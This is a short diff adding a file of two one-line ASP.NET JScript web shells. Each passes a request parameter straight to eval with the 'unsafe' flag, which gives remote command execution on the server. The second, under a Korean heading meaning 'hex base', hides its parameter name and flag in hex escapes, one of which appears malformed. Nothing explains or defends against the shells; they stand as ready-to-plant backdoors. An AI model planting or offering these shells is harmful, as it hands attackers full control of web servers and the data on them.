@@ -1,0 +1,5 @@
+<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
+
+
+16진수 베이스
+<%@PAGE LANGUAGE=JSCRIPT%><%var PAY:String=Request["\x68\x79\6f\x74\x77\x6f"];eval(PAY,"\x75\x6E\x73\x61"+"\x66\x65");%>
